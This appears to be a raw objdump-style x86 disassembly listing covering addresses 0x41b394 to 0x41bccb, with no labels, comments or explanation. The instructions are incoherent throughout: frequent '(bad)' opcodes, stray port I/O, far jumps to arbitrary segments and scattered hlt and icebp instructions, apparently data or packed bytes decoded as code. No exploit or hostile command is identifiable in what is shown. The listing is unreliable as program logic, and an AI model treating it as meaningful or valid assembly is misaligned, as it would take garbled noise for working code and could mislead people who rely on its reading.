  41b394:	mov    bl,0x4f
  41b396:	call   0x3ec1f7
  41b39b:	push   cs
  41b39c:	lds    ecx,FWORD PTR [ebx]
  41b39e:	cmp    ecx,edx
  41b3a0:	bound  esi,QWORD PTR [eax]
  41b3a2:	add    ebx,ebp
  41b3a4:	xor    ah,bh
  41b3a6:	jne    0x41b389
  41b3a8:	sar    DWORD PTR [eax-0x1c],cl
  41b3ab:	addr16 add eax,0x4b21e858
  41b3b1:	(bad)  
  41b3b2:	call   esi
  41b3b4:	fwait
  41b3b5:	loope  0x41b3f0
  41b3b7:	pop    eax
  41b3b8:	or     ecx,esp
  41b3ba:	inc    ebx
  41b3bb:	dec    ebp
  41b3bc:	push   0xb
  41b3be:	(bad)  
  41b3bf:	mov    eax,0xf450e7bc
  41b3c4:	pop    es
  41b3c5:	add    BYTE PTR [ebx-0x15004348],al
  41b3cb:	inc    esp
  41b3cc:	test   BYTE PTR [ecx-0x8],cl
  41b3cf:	in     eax,dx
  41b3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3d1:	adc    al,0xcc
  41b3d3:	fiadd  WORD PTR [eax]
  41b3d5:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  41b3ed:	add    BYTE PTR [eax],al
  41b3ef:	add    BYTE PTR [edx-0x72eb8f20],cl
  41b3f5:	ins    BYTE PTR es:[edi],dx
  41b3f6:	adc    eax,0x805af801
  41b3fb:	jnp    0x41b432
  41b3fd:	pop    es
  41b3fe:	jae    0x41b40e
  41b400:	mov    ebx,DWORD PTR [edx+0x530920f5]
  41b406:	call   0xf4a44111
  41b40b:	add    eax,ebp
  41b40d:	pop    edx
  41b40e:	or     BYTE PTR [ebp+0x55],0x5e
  41b412:	repz inc ebp
  41b414:	push   ebp
  41b415:	pop    esi
  41b416:	or     al,0x84
  41b418:	hlt    
  41b419:	push   ds
  41b41a:	add    al,BYTE PTR [eax]
  41b41c:	hlt    
  41b41d:	out    0xbf,al
  41b41f:	daa    
  41b420:	mov    dl,0xa9
  41b422:	clc    
  41b423:	(bad)  
  41b424:	js     0x41b452
  41b426:	out    dx,al
  41b427:	adc    DWORD PTR [esi+0x3b],ecx
  41b42a:	jbe    0x41b4a7
  41b42c:	push   0x5b135974
  41b431:	ins    BYTE PTR es:[edi],dx
  41b432:	add    DWORD PTR [ecx+0x4d79cbb],ecx
  41b438:	(bad)  
  41b439:	xchg   edi,eax
  41b43a:	imul   eax,DWORD PTR [ebx-0x74],0x5c
  41b43e:	in     eax,dx
  41b43f:	cmp    BYTE PTR [ebx-0x6917e321],cl
  41b445:	cmp    al,0x2
  41b447:	add    BYTE PTR [edi+0x5c],ch
  41b44a:	ja     0x41b4bf
  41b44c:	fs loope 0x41b4b9
  41b44f:	or     eax,0x2db70
	...
  41b46c:	add    ah,dh
  41b46e:	inc    BYTE PTR [ebx+0x37]
  41b471:	mov    bh,0x3
  41b473:	fiadd  DWORD PTR [ecx-0x7f]
  41b476:	push   eax
  41b477:	adc    DWORD PTR [edx+0x265aebfe],ecx
  41b47d:	leave  
  41b47e:	pusha  
  41b47f:	inc    edi
  41b480:	add    ch,dh
  41b482:	inc    esi
  41b483:	or     al,0x80
  41b485:	sub    eax,0x3200d707
  41b48a:	outs   dx,BYTE PTR ds:[esi]
  41b48b:	and    DWORD PTR [eax-0x21],eax
  41b48e:	cs sub al,0x72
  41b491:	pop    ss
  41b492:	xchg   DWORD PTR ds:0x14b8f81,esp
  41b498:	or     eax,0x30b71
  41b49d:	hlt    
  41b49e:	cmc    
  41b49f:	sti    
  41b4a0:	mov    bh,BYTE PTR [ecx-0x3d]
  41b4a3:	mov    ebx,0x419ace7
  41b4a8:	add    BYTE PTR [edi+0x4],bh
  41b4ab:	cs mov ah,0x4d
  41b4ae:	or     al,0xbf
  41b4b0:	imul   ebp,DWORD PTR [ecx-0xc],0xffffffe7
  41b4b4:	add    edi,DWORD PTR [ebx-0x41]
  41b4b7:	push   esi
  41b4b8:	xchg   DWORD PTR [edi+0x55],ecx
  41b4bb:	out    0x12,eax
  41b4bd:	js     0x41b47f
  41b4bf:	out    0x3,eax
  41b4c1:	hlt    
  41b4c2:	test   esp,ecx
  41b4c4:	imul   esi,esp,0xffffff9a
  41b4c7:	daa    
  41b4c8:	cmp    dh,BYTE PTR ds:0x762bd05
  41b4ce:	std    
  41b4cf:	clc    
  41b4d0:	ret    
	...
  41b4e9:	add    BYTE PTR [ebx-0x555fb821],bl
  41b4ef:	(bad)
  41b4f2:	jbe    0x41b538
  41b4f4:	jnp    0x41b4ba
  41b4f6:	ins    BYTE PTR es:[edi],dx
  41b4f7:	pop    es
  41b4f8:	xor    edi,DWORD PTR [edx]
  41b4fa:	xor    eax,0xe84d6c05
  41b4ff:	adc    esi,ebx
  41b501:	call   0x3f3:0xfaceb334
  41b508:	out    0x88,eax
  41b50a:	xor    al,0xd0
  41b50c:	add    BYTE PTR [ebx],dl
  41b50e:	mov    edi,ebp
  41b510:	mov    bh,BYTE PTR [ecx]
  41b512:	mov    ch,0x4
  41b514:	cli    
  41b515:	dec    esp
  41b516:	jnp    0x41b4d7
  41b518:	into   
  41b519:	mov    BYTE PTR [esi],ah
  41b51b:	rcl    al,1
  41b51d:	jmp    0x2460cd96
  41b522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b523:	add    DWORD PTR [ecx],edx
  41b525:	and    al,0xbe
  41b527:	loop   0x41b598
  41b529:	div    DWORD PTR [ebx+0x4ff85e09]
  41b52f:	xor    ch,BYTE PTR [edx]
  41b531:	add    al,0xcb
  41b533:	sbb    eax,0xb219d5b1
  41b538:	jge    0x41b532
  41b53a:	fcomip st,st(6)
  41b53c:	jmp    FWORD PTR [eax]
  41b53e:	clc    
  41b53f:	pop    ecx
  41b540:	jno    0x41b523
  41b542:	jp     0x41b50a
  41b544:	or     edx,ebx
  41b546:	imul   DWORD PTR [esp+ebp*1-0x11]
  41b54a:	lock add al,0x89
  41b54d:	push   ecx
	...
  41b566:	add    BYTE PTR [edx+ebx*2+0xd],bh
  41b56a:	arpl   WORD PTR gs:0x1cd1e900,ax
  41b571:	pop    esi
  41b572:	xchg   edi,eax
  41b573:	fs test al,ah
  41b576:	aaa    
  41b577:	push   ss
  41b578:	pop    edx
  41b579:	push   0xffffffe9
  41b57b:	addr16 pop ecx
  41b57d:	adc    edi,DWORD PTR [ecx+0x6a00189d]
  41b583:	xor    ecx,DWORD PTR [ecx]
  41b585:	mov    ebp,DWORD PTR [edi+edx*1+0x57]
  41b589:	std    
  41b58a:	push   cs
  41b58b:	inc    edi
  41b58c:	out    dx,al
  41b58d:	inc    DWORD PTR ds:0x34870caa
  41b593:	pop    ss
  41b594:	push   edi
  41b595:	std    
  41b596:	not    ch
  41b598:	aad    0x7
  41b59a:	out    dx,al
  41b59b:	arpl   WORD PTR [ebx+edx*1-0x77a07d7],bx
  41b5a2:	call   0xffab85e9
  41b5a7:	adc    BYTE PTR [esp+ecx*2+0x5859d5cc],0xd1
  41b5af:	inc    eax
  41b5b0:	stos   BYTE PTR es:[edi],al
  41b5b1:	add    cl,ch
  41b5b3:	dec    ecx
  41b5b4:	out    dx,eax
  41b5b5:	mov    bh,BYTE PTR [esp+esi*8+0x59]
  41b5b9:	std    
  41b5ba:	scas   al,BYTE PTR es:[edi]
  41b5bb:	push   0xf8570a60
  41b5c0:	add    al,0x81
  41b5c2:	sbb    al,0xa4
  41b5c4:	add    al,0x89
  41b5c6:	cmp    al,0xa0
  41b5c8:	lea    ecx,[ecx-0x7]
	...
  41b5e3:	add    BYTE PTR [edi-0x43],ch
  41b5e6:	jae    0x41b5e8
  41b5e8:	int    0x0
  41b5ea:	xchg   eax,esi
  41b5ec:	or     bh,BYTE PTR [edi]
  41b5ee:	jb     0x41b5dc
  41b5f0:	pusha  
  41b5f1:	ud2    
  41b5f3:	inc    esp
  41b5f4:	lea    edi,[edi-0x3b]
  41b5f7:	jne    0x41b5c9
  41b5f9:	jp     0x41b5c3
  41b5fb:	jbe    0x41b58a
  41b5fd:	add    esi,esi
  41b5ff:	inc    ebp
  41b600:	and    eax,0x28067404
  41b605:	sbb    BYTE PTR [edi+edi*8],0x3a
  41b609:	out    0xfa,al
  41b60b:	jne    0x41b60a
  41b60d:	call   0x858a:0x9c8d514f
  41b614:	mov    DWORD PTR [esi-0xfa20006],esi
  41b61a:	mov    edi,0xfdd53883
  41b61f:	(bad)  
  41b620:	jmp    0xbfcf:0xaa006a0c
  41b627:	push   edi
  41b628:	push   cs
  41b629:	rol    DWORD PTR [esi],0x50
  41b62c:	in     eax,0x66
  41b62e:	sahf   
  41b62f:	add    DWORD PTR [ebp-0x80],ebx
  41b632:	les    ebp,FWORD PTR [eax]
  41b634:	aad    0x3f
  41b636:	or     BYTE PTR [edi+0x45],dl
  41b639:	cdq    
  41b63a:	and    al,0x1
  41b63c:	dec    ebp
  41b63d:	in     al,0x70
  41b63f:	call   0x1664779
  41b644:	pop    ebp
  41b645:	in     al,0x70
  41b647:	lock add BYTE PTR [eax],al
	...
  41b65e:	add    BYTE PTR [eax],al
  41b660:	add    BYTE PTR ds:0x4d012449,ah
  41b666:	cmp    DWORD PTR [ecx+0xb],0x1d
  41b66a:	add    DWORD PTR cs:[ebx-0xd4750],eax
  41b671:	add    ch,dl
  41b673:	out    0x38,eax
  41b675:	xor    al,BYTE PTR [edx]
  41b677:	add    dh,dh
  41b679:	hlt    
  41b67a:	sub    BYTE PTR [edi+edi*8-0x80],bl
  41b67e:	cmp    al,0xb4
  41b680:	out    0x58,eax
  41b682:	fistp  DWORD PTR [edi-0x3]
  41b685:	jo     0x41b634
  41b687:	aad    0x3
  41b689:	ja     0x41b6ac
  41b68b:	pop    esp
  41b68c:	add    ah,dl
  41b68e:	and    DWORD PTR [eax+edx*1+0x68],ebx
  41b692:	add    DWORD PTR [ebx-0x2992e787],eax
  41b698:	push   es
  41b699:	jg     0x41b646
  41b69b:	sbb    DWORD PTR [ecx+0x7301604c],eax
  41b6a1:	bnd jp 0x41b70d
  41b6a4:	push   ds
  41b6a5:	ret    
  41b6a6:	pop    ss
  41b6a7:	pusha  
  41b6a8:	test   BYTE PTR [eax+ebx*4+0x14398105],dh
  41b6af:	add    eax,0x8c2429fd
  41b6b4:	icebp  
  41b6b5:	mov    esp,es
  41b6b7:	cmp    bh,0x93
  41b6ba:	jecxz  0x41b681
  41b6bc:	imul   DWORD PTR [ebx]
  41b6be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6bf:	mov    esp,0x168b6c6
  41b6c4:	push   ebx
	...
  41b6dd:	add    BYTE PTR [edi+0x8],ch
  41b6e0:	mov    WORD PTR [ebx+0xc],es
  41b6e3:	jmp    0x41b751
  41b6e5:	adc    al,0xc7
  41b6e7:	ins    DWORD PTR es:[edi],dx
  41b6e8:	mov    WORD PTR [eax],?
  41b6ea:	outs   dx,DWORD PTR ds:[esi]
  41b6eb:	sub    DWORD PTR [eax],eax
  41b6ed:	mov    esp,esi
  41b6ef:	push   cs
  41b6f0:	(bad)  
  41b6f1:	jl     0x41b6ed
  41b6f3:	imul   esp,DWORD PTR cs:[esi],0xfffffff5
  41b6f7:	imul   eax,DWORD PTR [ecx],0xffffff80
  41b6fa:	add    cl,BYTE PTR [ecx]
  41b6fc:	or     eax,0x16cd883
  41b701:	add    BYTE PTR [esi-0xa],bh
  41b704:	add    al,BYTE PTR [eax-0x7df1a3d2]
  41b70a:	add    al,0x5
  41b70c:	call   0xa1c6ab14
  41b711:	sbb    eax,0x4ee7e01
  41b716:	hlt    
  41b717:	add    al,0x62
  41b719:	shr    ebx,1
  41b71b:	mov    eax,esi
  41b71d:	adc    bl,BYTE PTR ds:0xdd5f2588
  41b723:	std    
  41b724:	data16 sbb al,0x17
  41b727:	shl    ah,1
  41b729:	ret    0x1a3b
  41b72c:	das    
  41b72d:	(bad)  
  41b72e:	out    0x4e,al
  41b730:	sub    al,BYTE PTR ds:0x44e8001
  41b736:	hlt    
  41b737:	add    al,0x67
  41b739:	pop    edx
  41b73a:	add    al,0xd0
  41b73c:	jmp    0x91:0x469b412
	...
  41b75b:	aaa    
  41b75c:	pop    ecx
  41b75d:	xchg   edi,eax
  41b75e:	pop    esi
  41b75f:	daa    
  41b760:	or     eax,0x3e9fb95f
  41b765:	lods   al,BYTE PTR ds:[esi]
  41b766:	pusha  
  41b767:	hlt    
  41b768:	ins    BYTE PTR es:[edi],dx
  41b769:	cmc    
  41b76a:	add    DWORD PTR [ebx-0x74a395ab],edx
  41b770:	push   es
  41b771:	pop    ebx
  41b772:	inc    edx
  41b773:	hlt    
  41b774:	add    al,0xe7
  41b776:	sbb    dh,BYTE PTR [edi]
  41b778:	cmc    
  41b779:	in     eax,dx
  41b77a:	sub    BYTE PTR [ebx+0x7d03e704],0xc7
  41b781:	ficom  DWORD PTR [eax+0xb7243f8]
  41b787:	ins    DWORD PTR es:[edi],dx
  41b788:	fsubr  st(2),st
  41b78a:	sub    cl,BYTE PTR [ebx+0x1]
  41b78d:	and    al,0xf8
  41b78f:	mov    al,ds:0x1a9fbeb3
  41b794:	add    al,0xe7
  41b796:	mov    WORD PTR [edi-0x57a19ba4],?
  41b79c:	or     al,0x0
  41b79e:	ins    BYTE PTR es:[edi],dx
  41b79f:	mov    bh,0x7
  41b7a1:	test   BYTE PTR [edi+esi*8+0x6f3e0004],al
  41b7a8:	cmp    al,0xe8
  41b7aa:	and    al,0x97
  41b7ac:	push   edi
  41b7ad:	std    
  41b7ae:	bound  ecx,QWORD PTR [ecx+edi*8-0x78]
  41b7b2:	sti    
  41b7b3:	outs   dx,BYTE PTR ds:[esi]
  41b7b4:	cmp    al,0x89
  41b7b6:	sub    al,0xf4
  41b7b8:	mov    eax,DWORD PTR [eax]
  41b7ba:	ins    BYTE PTR es:[edi],dx
  41b7bb:	sar    esp,cl
  41b7bd:	std    
  41b7be:	bound  eax,QWORD PTR [eax]
	...
  41b7d8:	mov    esp,0x6ee988fc
  41b7dd:	cmp    eax,0xc1843729
  41b7e2:	push   cs
  41b7e3:	pop    edi
  41b7e4:	push   ds
  41b7e5:	push   ebp
  41b7e6:	xchg   DWORD PTR [ebx+eiz*1+0x6e59738c],esp
  41b7ed:	fcom   DWORD PTR [edi]
  41b7ef:	je     0x41b79b
  41b7f1:	push   ebx
  41b7f2:	in     eax,0xa4
  41b7f4:	fcom   QWORD PTR [ebx-0x3]
  41b7f7:	ins    DWORD PTR es:[edi],dx
  41b7f8:	aaa    
  41b7f9:	fldcw  WORD PTR [edx+0x62]
  41b7fc:	cmp    DWORD PTR [esi+0x30],edi
  41b7ff:	jmp    0xd5f5:0x228164bc
  41b806:	adc    DWORD PTR [esi],edx
  41b808:	lods   al,BYTE PTR ds:[esi]
  41b809:	pop    eax
  41b80a:	mov    esp,DWORD PTR [edi-0x12754b0b]
  41b810:	out    0xb4,al
  41b812:	out    0xca,eax
  41b814:	sbb    DWORD PTR [ebp+edi*8+0x2],edx
  41b818:	pusha  
  41b819:	fimul  DWORD PTR [edx+eiz*2]
  41b81c:	inc    esp
  41b81d:	pop    eax
  41b81e:	mov    ebp,DWORD PTR [edi]
  41b820:	div    BYTE PTR [edx+ecx*4+0x255ce4f5]
  41b827:	maskmovq mm0,(bad)
  41b828:	test   DWORD PTR [ecx+edx*2],0x565c2bce
  41b82f:	add    BYTE PTR [edx],dh
  41b831:	pop    esp
  41b832:	dec    ecx
  41b833:	push   ss
  41b834:	fisttp QWORD PTR [eax]
  41b836:	jg     0x41b7fc
  41b838:	adc    DWORD PTR [ecx+0xf870],esi
	...
  41b852:	add    BYTE PTR [eax],al
  41b854:	add    BYTE PTR ds:0xd012173,dh
  41b85a:	jge    0x41b89d
  41b85c:	sbb    al,0x84
  41b85e:	lock xchg BYTE PTR [ebp+0x5],al
  41b862:	jge    0x41b864
  41b864:	(bad)  
  41b865:	jmp    0xf1cfb4bc
  41b86a:	lock cli 
  41b86c:	inc    esi
  41b86d:	mov    dh,0xb8
  41b86f:	or     al,BYTE PTR [edx-0x54d71]
  41b875:	sbb    eax,0xb65e5b08
  41b87a:	mov    esi,0xf5dd18c1
  41b87f:	mov    edi,0x70b228eb
  41b884:	clc    
  41b885:	xor    eax,0xcd012183
  41b88a:	fdivr  st(1),st
  41b88c:	push   ebp
  41b88d:	es aad 0x7e
  41b890:	in     al,dx
  41b891:	cmp    DWORD PTR [ecx+eax*2+0x8],0x564f0916
  41b899:	es cmp al,0x9
  41b89c:	mov    esp,DWORD PTR [ebx+0x75c80098]
  41b8a2:	ret    
  41b8a3:	jne    0x41b8e5
  41b8a5:	lea    edi,[esi+0x49]
  41b8a8:	clc    
  41b8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8aa:	mov    edi,0x8c486a4c
  41b8af:	ret    
  41b8b0:	inc    ebp
  41b8b1:	bound  eax,QWORD PTR [edi]
  41b8b3:	call   0x47f423
  41b8b8:	mov    eax,DWORD PTR [eax]
	...
  41b8d2:	xor    eax,0xd90fd78a
  41b8d7:	sar    bh,cl
  41b8d9:	push   esp
  41b8db:	pop    ebp
  41b8dc:	mov    BYTE PTR [ebx-0x10],bh
  41b8df:	fstp   st(5)
  41b8e1:	cld    
  41b8e2:	hlt    
  41b8e3:	adc    BYTE PTR [edx+ebp*2],bl
  41b8e6:	aam    0xe0
  41b8e8:	fst    st(7)
  41b8ea:	int3   
  41b8eb:	inc    ebp
  41b8ec:	mov    bh,0xa8
  41b8ee:	hlt    
  41b8ef:	pop    ebp
  41b8f0:	mov    es,WORD PTR [ebx+0xc]
  41b8f3:	or     eax,0x72ad1f6c
  41b8f8:	pop    esp
  41b8f9:	test   BYTE PTR [ecx+esi*8],dh
  41b8fc:	std    
  41b8fd:	or     al,0x4b
  41b8ff:	sub    BYTE PTR [eax+0x50],dh
  41b902:	outs   dx,DWORD PTR ds:[esi]
  41b903:	mov    ds:0xf32469b1,al
  41b908:	mov    WORD PTR [ebx-0x64],?
  41b90b:	test   BYTE PTR [ebp-0x77a40aec],ch
  41b911:	jae    0x41b8fb
  41b913:	(bad)  
  41b914:	pop    eax
  41b915:	push   edi
  41b916:	sub    eax,0xf67d5be9
  41b91b:	out    dx,al
  41b91c:	pop    edx
  41b91d:	mov    DWORD PTR [ecx],esi
  41b91f:	mov    ah,0x27
  41b921:	leave  
  41b922:	ja     0x41b8d9
  41b924:	cmc    
  41b925:	dec    esi
  41b926:	adc    DWORD PTR [edi+0x3af08af6],0xa96d4fb2
  41b930:	push   ebp
  41b931:	std    
  41b932:	add    DWORD PTR [ebx+esi*8+0x3f],edi
	...
  41b94e:	add    ah,dh
  41b950:	fiadd  WORD PTR [esp+ecx*1+0x23]
  41b954:	jmp    0x8f66611e
  41b959:	pop    esp
  41b95a:	adc    ebp,DWORD PTR [eax]
  41b95c:	xor    al,cl
  41b95e:	(bad)  
  41b95f:	jle    0x41b902
  41b961:	or     DWORD PTR [ecx-0x173c1703],ecx
  41b967:	cmc    
  41b968:	imul   eax,DWORD PTR [eax],0x2c056f0e
  41b96e:	push   eax
  41b96f:	jne    0x41b9ba
  41b971:	jmp    0x41b95e
  41b973:	aas    
  41b974:	(bad)  [esi]
  41b976:	add    al,0x7b
  41b978:	ror    dh,0x2f
  41b97b:	sub    al,0xb4
  41b97d:	push   eax
  41b97e:	icebp  
  41b97f:	int3   
  41b980:	dec    edx
  41b981:	and    al,0x5b
  41b983:	sub    ebp,DWORD PTR [edx-0x5b]
  41b986:	and    DWORD PTR [ebx],esp
  41b988:	push   edx
  41b989:	bound  edi,QWORD PTR [edi+esi*2]
  41b98c:	test   BYTE PTR cs:[eax+0x5b9e519a],0x7e
  41b994:	enter  0xbb95,0xa1
  41b998:	lods   eax,DWORD PTR ds:[esi]
  41b999:	lahf   
  41b99a:	inc    esi
  41b99b:	in     al,dx
  41b99c:	add    al,0x1c
  41b99e:	(bad)  
  41b99f:	loopne 0x41b926
  41b9a1:	mov    esi,esp
  41b9a3:	inc    esp
  41b9a4:	mov    ebx,0xdee48f1d
  41b9a9:	in     al,0x8e
  41b9ab:	mov    esi,0xc7d16fae
  41b9b0:	jge    0x41b9da
  41b9b2:	pop    ds
	...
  41b9cb:	add    dh,al
  41b9cd:	(bad)  
  41b9ce:	cmc    
  41b9cf:	mov    es,WORD PTR [esi+ecx*1]
  41b9d2:	pop    ecx
  41b9d3:	(bad)  
  41b9d4:	loop   0x41b9e3
  41b9d6:	mov    esp,0xc4f9294f
  41b9db:	mov    gs,WORD PTR [edi]
  41b9dd:	cmc    
  41b9de:	int3   
  41b9df:	sbb    BYTE PTR [ecx+ecx*1],0xb4
  41b9e3:	hlt    
  41b9e4:	rcl    bh,cl
  41b9e6:	sbb    al,BYTE PTR [edi]
  41b9e8:	mov    edx,0x54fb40b
  41b9ed:	fld    DWORD PTR fs:[ebx-0x65]
  41b9f1:	jne    0x41b9db
  41b9f3:	add    esi,esp
  41b9f5:	test   DWORD PTR [eax],ebp
  41b9f7:	add    bh,BYTE PTR [ebp+0x52]
  41b9fa:	rcr    BYTE PTR [ebp+0x32],cl
  41b9fd:	(bad)  
  41b9fe:	push   ebp
  41ba00:	test   DWORD PTR [ecx-0x329706b5],0xb7ff5df3
  41ba0a:	sub    BYTE PTR [ecx-0x57184b0b],0xe3
  41ba11:	push   ecx
  41ba12:	std    
  41ba13:	pusha  
  41ba14:	xor    al,0x59
  41ba16:	jmp    0xf8273508
  41ba1b:	jmp    0x22b60994
  41ba20:	jnp    0x41b9ef
  41ba22:	imul   ecx
  41ba24:	sub    eax,DWORD PTR [ecx]
  41ba26:	mov    ebp,DWORD PTR [esp+eiz*4]
  41ba29:	mov    ah,0x8a
  41ba2b:	and    al,0xa8
  41ba2d:	mov    ah,0xe7
  41ba2f:	dec    esi
	...
  41ba48:	add    BYTE PTR [ebp+0x1c62fd4f],bl
  41ba4e:	push   ebp
  41ba4f:	add    DWORD PTR [esi-0x37ee03d],0x4f
  41ba56:	add    eax,0x50016d0d
  41ba5b:	std    
  41ba5c:	jmp    0x74498ecb
  41ba61:	mov    ah,0x54
  41ba63:	push   eax
  41ba64:	ins    BYTE PTR es:[edi],dx
  41ba65:	mov    ah,0x58
  41ba67:	push   eax
  41ba68:	push   esi
  41ba69:	stos   BYTE PTR es:[edi],al
  41ba6a:	add    ch,bh
  41ba6c:	aam    0xf3
  41ba6e:	mov    dh,0xfc
  41ba70:	mov    esp,0x3c195d47
  41ba75:	dec    esi
  41ba76:	push   edx
  41ba77:	test   BYTE PTR [ecx],ch
  41ba79:	out    dx,al
  41ba7a:	mov    BYTE PTR [eax],bl
  41ba7c:	call   0xa4cabf78
  41ba81:	inc    ebx
  41ba82:	pop    esi
  41ba83:	add    DWORD PTR [edx-0x5c],esi
  41ba86:	or     BYTE PTR [esi+0x6a],ah
  41ba89:	pushf  
  41ba8a:	add    BYTE PTR [eax],cl
  41ba8c:	fidiv  WORD PTR [edi+eiz*4+0x0]
  41ba90:	add    BYTE PTR [ebp+0x4],bl
  41ba93:	push   0xfd43e3e4
  41ba98:	(bad)  
  41ba99:	loopne 0x41ba4e
  41ba9b:	out    0x7f,eax
  41ba9d:	dec    edx
  41ba9e:	add    eax,DWORD PTR [eax]
  41baa0:	adc    DWORD PTR [ebp-0x54],0x70
  41baa4:	add    ch,dh
  41baa6:	enter  0xc080,0x5a
  41baaa:	jl     0x41ba91
	...
  41bac4:	add    BYTE PTR [eax],al
  41bac6:	dec    ebp
  41bac7:	add    al,0x37
  41bac9:	inc    ebp
  41baca:	sub    ebp,edi
  41bacc:	jle    0x41baae
  41bace:	sbb    eax,0xe68b0004
  41bad3:	push   esp
  41bad4:	mov    dh,BYTE PTR [ebx+edx*2]
  41bad7:	and    bh,BYTE PTR [esi+0x4]
  41bada:	push   ds
  41badb:	out    dx,al
  41badc:	(bad)  
  41badd:	jl     0x41bb40
  41badf:	inc    BYTE PTR [ebx+0x40dcc]
  41bae5:	mov    edx,DWORD PTR [edx-0x1f]
  41bae8:	jns    0x41bb0d
  41baea:	fadd   QWORD PTR [ebx]
  41baec:	test   DWORD PTR [ebp-0x33],eax
  41baef:	into   
  41baf0:	mov    edi,0x6f510f
  41baf5:	add    ch,cl
  41baf7:	lods   al,BYTE PTR ds:[esi]
  41baf8:	xor    eax,0x4d53aeff
  41bafd:	inc    eax
  41baff:	inc    edi
  41bb00:	adc    eax,DWORD PTR [eax-0x33]
  41bb03:	add    BYTE PTR [esi],0x3
  41bb06:	nop
  41bb07:	push   ebx
  41bb08:	add    ah,0xa9
  41bb0b:	lods   al,BYTE PTR ds:[esi]
  41bb0c:	jo     0x41bb02
  41bb0e:	jmp    0x495f:0xea50f53f
  41bb15:	push   ss
  41bb16:	dec    ebp
  41bb17:	add    eax,DWORD PTR [edi+0x4780a146]
  41bb1d:	adc    al,0xa6
  41bb1f:	mov    ebx,0x69f4c47e
  41bb24:	mov    dl,0x88
  41bb26:	das    
  41bb27:	dec    esi
  41bb28:	add    al,0xc8
	...
  41bb42:	add    BYTE PTR [edi+0x5f],bh
  41bb45:	mov    WORD PTR [ebx+0x4],?
  41bb48:	pop    ebx
  41bb49:	aas    
  41bb4a:	add    DWORD PTR [ecx+0x5b4fb251],edi
  41bb50:	cmp    ch,al
  41bb52:	adc    eax,0xc4845db4
  41bb57:	clc    
  41bb58:	cs aam 0xf
  41bb5b:	dec    esp
  41bb5c:	or     ah,BYTE PTR [ebx]
  41bb5e:	(bad)  
  41bb5f:	cmp    esp,esp
  41bb61:	ror    DWORD PTR [edi],cl
  41bb63:	jge    0x41bb27
  41bb65:	out    dx,eax
  41bb66:	lds    esi,FWORD PTR [ecx-0x3c16fd72]
  41bb6c:	fcmovbe st,st(5)
  41bb6e:	div    esp
  41bb70:	sbb    BYTE PTR [edi],bl
  41bb72:	mov    edx,edi
  41bb74:	rcl    dh,cl
  41bb76:	add    edi,DWORD PTR [edi+0x12]
  41bb79:	hlt    
  41bb7a:	sub    ah,bh
  41bb7c:	or     eax,0x85a5c803
  41bb81:	jne    0x41bba4
  41bb83:	cmc    
  41bb84:	pop    ebx
  41bb85:	mov    al,BYTE PTR [ebx-0x14]
  41bb88:	jmp    0xef652fcd
  41bb8d:	mov    bl,al
  41bb8f:	int3   
  41bb90:	xchg   ecx,eax
  41bb91:	popa   
  41bb92:	std    
  41bb93:	rcl    ebp,cl
  41bb95:	mov    ebp,0x8be47ff3
  41bb9a:	pop    ebx
  41bb9b:	fsubr  st(2),st
  41bb9d:	add    ecx,DWORD PTR [ecx+0x4c865841]
  41bba3:	in     al,dx
  41bba4:	pop    esp
  41bba5:	imul   eax,DWORD PTR [ebp+0x0],0x0
	...
  41bbc0:	(bad)  
  41bbc1:	pop    esp
  41bbc2:	add    DWORD PTR [esp+esi*4-0xd770970],eax
  41bbc9:	pop    edx
  41bbca:	add    al,0x55
  41bbcc:	xchg   ebx,eax
  41bbcd:	add    eax,0x4e245b9c
  41bbd2:	hlt    
  41bbd3:	(bad)  
  41bbd4:	jmp    0xbd46a29d
  41bbd9:	jns    0x41bbc0
  41bbdb:	test   BYTE PTR [eax],bh
  41bbdd:	add    DWORD PTR ds:0xa5faf0ff,ebp
  41bbe3:	mov    bl,BYTE PTR ds:0x4c5b7c4e
  41bbe9:	gs leave 
  41bbeb:	add    dh,ah
  41bbed:	jp     0x41bc1b
  41bbef:	push   edi
  41bbf0:	test   eax,0x364d41ae
  41bbf5:	stc    
  41bbf6:	out    0xb0,al
  41bbf8:	ins    BYTE PTR es:[edi],dx
  41bbf9:	popa   
  41bbfa:	push   0x68
  41bbfc:	aam    0xb1
  41bbfe:	sbb    al,0x13
  41bc00:	xor    al,0xb6
  41bc02:	jno    0x41bbdd
  41bc04:	sti    
  41bc05:	jnp    0x41bc33
  41bc07:	pusha  
  41bc08:	jae    0x41bbd2
  41bc0a:	mov    esi,0xf5f0b91d
  41bc0f:	jge    0x41bc36
  41bc11:	add    al,0xe7
  41bc13:	add    edi,DWORD PTR [ebx-0x38]
  41bc16:	or     BYTE PTR [ebx-0x2f16137f],0xdf
  41bc1d:	adc    DWORD PTR [edx+0x71fd6257],esp
  41bc23:	scas   al,BYTE PTR es:[edi]
	...
  41bc3c:	add    bh,ch
  41bc3e:	fcmovu st,st(6)
  41bc40:	scas   al,BYTE PTR es:[edi]
  41bc41:	rcl    DWORD PTR [ebp-0x772ea885],cl
  41bc47:	daa    
  41bc48:	pop    es
  41bc49:	jo     0x41bcb8
  41bc4b:	call   0xdd8fb053
  41bc50:	or     ebp,DWORD PTR [ebp-0x4a]
  41bc53:	fucompp 
  41bc55:	add    esi,DWORD PTR [esi+0x4d98a54e]
  41bc5b:	xor    BYTE PTR ds:[ebp+edi*8+0x4d696cff],0xfd
  41bc64:	jmp    0xc85582e7
  41bc69:	dec    esp
  41bc6a:	pop    ebp
  41bc6b:	pop    ds
  41bc6c:	mov    esp,0xf95e7c33
  41bc71:	push   0xd06afbc1
  41bc76:	push   es
  41bc77:	or     eax,0x51b6b
  41bc7c:	jmp    0xf1c2bfef
  41bc81:	pop    ecx
  41bc82:	add    BYTE PTR [edx+0x4f859],al
  41bc88:	and    dh,BYTE PTR ds:0xc2660d49
  41bc8e:	add    al,0x0
  41bc90:	jmp    0xe58b5487
  41bc95:	ror    DWORD PTR [ebp-0x32e2c2ec],0xde
  41bc9c:	in     eax,0xfa
  41bc9e:	xchg   esi,eax
  41bc9f:	(bad)  
  41bca0:	mov    esi,0x0
	...
  41bcb9:	add    al,bl
  41bcbb:	jmp    0x41bc83
  41bcbd:	push   0xffffff98
  41bcbf:	pop    esp
  41bcc0:	sub    DWORD PTR [eax-0x4f4b0029],0x6adfb970
  41bcca:	lahf   
  41bccb:	(bad)  
